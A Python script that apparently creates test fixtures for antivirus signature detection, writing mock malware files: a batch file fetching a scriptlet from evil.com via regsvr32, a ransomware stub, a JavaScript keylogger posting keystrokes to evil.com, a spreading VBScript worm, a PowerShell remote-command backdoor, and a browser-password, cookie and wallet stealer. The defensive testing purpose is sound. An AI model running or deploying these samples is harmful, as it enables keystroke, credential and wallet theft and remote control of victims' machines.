#!/usr/bin/env python3
"""
Test malware signature detection with real simulated malware content
"""

import os
from pathlib import Path

def create_test_malware_files():
    """Create test files with real malware signatures."""
    
    # Create test directory
    test_dir = Path("test_signature_detection")
    test_dir.mkdir(exist_ok=True)
    
    # Test files with different malware signatures
    test_files = {
        "trojan_test.bat": """@echo off
echo Creating remote thread for process injection
powershell -enc "CreateRemoteThread VirtualAllocEx WriteProcessMemory"
regsvr32 /s /u /i:http://evil.com/payload.sct scrobj.dll
""",
        
        "ransomware_test.py": """import os
import crypto
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt_files():
    # Encrypt all files with AES
    for file in os.listdir('.'):
        if file.endswith('.doc') or file.endswith('.pdf'):
            encrypt_file(file)
    
    # Demand bitcoin payment
    print("Your files are encrypted. Pay 1 bitcoin to decrypt.")
    print("Bitcoin wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")

def encrypt_file(filename):
    # AES encryption
    key = os.urandom(32)
    cipher = AES.new(key, AES.MODE_CBC)
    # ... encryption code
""",
        
        "keylogger_test.js": """// JavaScript keylogger
document.addEventListener('keydown', function(event) {
    // Capture keystrokes
    var key = event.key;
    logKeystroke(key);
});

function logKeystroke(key) {
    // Send to remote server
    fetch('http://evil.com/log', {
        method: 'POST',
        body: JSON.stringify({key: key, timestamp: Date.now()})
    });
}

// Mouse tracking
document.addEventListener('mousemove', function(event) {
    logMousePosition(event.clientX, event.clientY);
});
""",
        
        "worm_test.vbs": """' VBScript worm
Set fso = CreateObject("Scripting.FileSystemObject")
Set network = CreateObject("WScript.Network")

' Spread via network shares
For Each drive In network.EnumNetworkDrives()
    If drive <> "" Then
        CopyFile "worm.vbs", drive & "\\worm.vbs"
    End If
Next

' USB propagation
For Each drive In fso.Drives
    If drive.DriveType = 1 Then ' Removable drive
        CopyFile "worm.vbs", drive.Path & "\\autorun.inf"
    End If
Next
""",
        
        "backdoor_test.ps1": """# PowerShell backdoor
$listener = [System.Net.Sockets.TcpListener]::new(4444)
$listener.Start()

while($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    
    # Execute commands from remote
    $command = Read-String $stream
    $result = Invoke-Expression $command
    Write-String $stream $result
}
""",
        
        "stealer_test.py": """import os
import json
import requests

def steal_passwords():
    # Steal browser passwords
    chrome_path = os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data")
    
    # Extract passwords
    passwords = extract_chrome_passwords(chrome_path)
    
    # Send to C&C server
    send_data("passwords", passwords)

def steal_cookies():
    # Steal browser cookies
    cookies = extract_cookies()
    send_data("cookies", cookies)

def steal_wallets():
    # Steal cryptocurrency wallets
    wallet_paths = [
        "~/AppData/Roaming/Electrum/wallets/",
        "~/AppData/Roaming/Bitcoin/wallets/"
    ]
    
    for path in wallet_paths:
        if os.path.exists(path):
            wallets = extract_wallets(path)
            send_data("wallets", wallets)
""",
        
        "safe_test.txt": """This is a completely safe file.
It contains no malicious content or suspicious patterns.
Just normal text content for testing purposes.
"""
    }
    
    # Create the test files
    for filename, content in test_files.items():
        file_path = test_dir / filename
        with open(file_path, 'w') as f:
            f.write(content)
        print(f"Created: {file_path}")
    
    print(f"\nCreated {len(test_files)} test files in {test_dir}/")
    print("Run the antivirus on this directory to test signature detection!")

if __name__ == "__main__":
    create_test_malware_files()